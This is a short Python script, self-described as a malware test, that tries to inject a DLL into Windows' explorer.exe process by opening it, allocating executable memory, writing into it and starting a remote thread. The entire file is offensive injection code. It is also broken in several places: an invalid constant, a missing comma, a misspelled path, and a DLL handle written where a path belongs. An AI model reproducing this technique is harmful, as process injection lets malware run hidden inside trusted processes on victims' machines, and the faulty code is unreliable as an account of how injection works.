# Python Malware Test One- Basic DLL injection into explorer.exe
# Not Fully Complete

import ctypes

# Load the DLL file
dll = ctypes.CDLL("path/to/injrcted.dll")

# Get the process ID of the explorer.exe process
import psutil
for proc in psutil.process_iter():
    if proc.name() == "explorer.exe":
        pid = proc.pid
        break
    
# Open a handle to the explorer.exe process
handle = ctypes.windll.kernel32.OpenProcess(x1F0FFF, False pid)

# Allocate memory in the process
memory = ctypes.windll.kernel32.VirtualAllocEx(handle, 0, len(dll._handle), 0x1000, 0x40)

# Write the DLL file to the allocated memory
ctypes.windll.kernel32.WriteProcessMemory(handle, memory, dll._handle, len(dll._handle), 0)

# Create a remote thread in the  process to execute the DLL
thread_id = ctypes.c_ulong(0)
ctypes.windll.kernel32.CreateRemoteThread(handle, None, 0, memory, None, 0, ctypes.byref(thread_id))                                          